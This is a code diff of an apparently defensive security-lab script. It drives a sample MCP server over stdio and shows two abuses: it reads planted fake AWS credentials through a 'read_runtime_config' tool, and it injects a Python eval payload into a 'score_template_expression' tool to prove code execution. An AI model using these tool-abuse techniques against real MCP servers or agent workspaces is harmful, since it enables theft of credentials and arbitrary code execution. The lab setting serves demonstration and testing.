@@ -1,10 +1,13 @@
 #!/usr/bin/env python3
 from __future__ import annotations
 
+import asyncio
 import importlib.util
 import json
+import os
 import sys
 from pathlib import Path
+from typing import Any
 
 ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT))
@@ -22,19 +25,21 @@ STATE = ROOT / ".lab-state" / "darkside"
 MCP_SCRIPT = ROOT / "samples" / "mcp" / "workspace-admin-bridge.py"
 
 
-def load_mcp_module():
-    spec = importlib.util.spec_from_file_location("workspace_admin_bridge_demo", MCP_SCRIPT)
-    if spec is None or spec.loader is None:
-        raise RuntimeError(f"could not load {MCP_SCRIPT}")
-    module = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(module)
-    return module
+def ensure_mcp_runtime() -> None:
+    if importlib.util.find_spec("mcp") is not None:
+        return
+
+    venv_python = ROOT / ".venv" / "bin" / "python"
+    if venv_python.exists() and Path(sys.executable) != venv_python:
+        os.execv(str(venv_python), [str(venv_python), __file__, *sys.argv[1:]])
+
+    raise RuntimeError("MCP dependency is missing. Install requirements.txt first.")
 
 
 def fake_aws_credentials() -> str:
     return "\n".join(
         [
-            "[openclaw-lab]",
+            "[vibe-coding-lab]",
             f"aws_access_key_id = {FAKE_AWS_ACCESS_KEY}",
             f"aws_secret_access_key = {FAKE_AWS_SECRET_KEY}",
             f"aws_session_token = {FAKE_AWS_SESSION_TOKEN}",
@@ -50,10 +55,52 @@ def relative(path: Path) -> str:
         return str(path)
 
 
+def result_text(result: Any) -> str:
+    parts = []
+    for item in getattr(result, "content", None) or []:
+        text = getattr(item, "text", "")
+        if text:
+            parts.append(text)
+    return "\n".join(parts)
+
+
+async def run_mcp_calls(creds_path: Path, rce_marker: Path) -> tuple[list[str], str]:
+    from mcp import ClientSession
+    from mcp.client.stdio import StdioServerParameters, stdio_client
+
+    params = StdioServerParameters(
+        command=sys.executable,
+        args=[str(MCP_SCRIPT)],
+        cwd=str(ROOT),
+    )
+
+    async with stdio_client(params) as (read, write):
+        async with ClientSession(read, write) as session:
+            await session.initialize()
+            listed = await session.list_tools()
+            tool_names = sorted(tool.name for tool in listed.tools)
+
+            secret_result = await session.call_tool(
+                "read_runtime_config",
+                {"path": str(creds_path)},
+            )
+            await session.call_tool(
+                "score_template_expression",
+                {
+                    "expression": (
+                        "__import__('pathlib').Path(%r).write_text('mcp eval executed')"
+                        % str(rce_marker)
+                    )
+                },
+            )
+
+    return tool_names, result_text(secret_result)
+
+
 def main() -> int:
+    ensure_mcp_runtime()
     STATE.mkdir(parents=True, exist_ok=True)
-    fake_home = STATE / "fake-home"
-    creds_path = fake_home / ".aws" / "credentials"
+    creds_path = STATE / "fake-home" / ".aws" / "credentials"
     creds_path.parent.mkdir(parents=True, exist_ok=True)
     creds_path.write_text(fake_aws_credentials(), encoding="utf-8")
 
@@ -62,15 +109,13 @@ def main() -> int:
     stolen_path.unlink(missing_ok=True)
     rce_marker.unlink(missing_ok=True)
 
-    module = load_mcp_module()
-    secret = json.loads(module.read_runtime_config(str(creds_path)))
+    tool_names, secret_text = asyncio.run(run_mcp_calls(creds_path, rce_marker))
+    secret = json.loads(secret_text)
     stolen_path.write_text(json.dumps(secret, indent=2, sort_keys=True), encoding="utf-8")
-    module.score_template_expression(
-        "__import__('pathlib').Path(%r).write_text('mcp eval executed')"
-        % str(rce_marker)
-    )
 
     print_status("DARKSIDE_MCP_ABUSE=pass")
+    print("mcp_transport=stdio")
+    print("mcp_tools=" + ",".join(tool_names))
     print("mcp_tool=read_runtime_config")
     print(f"stolen_file={relative(creds_path)}")
     print(f"stolen_report={relative(stolen_path)}")
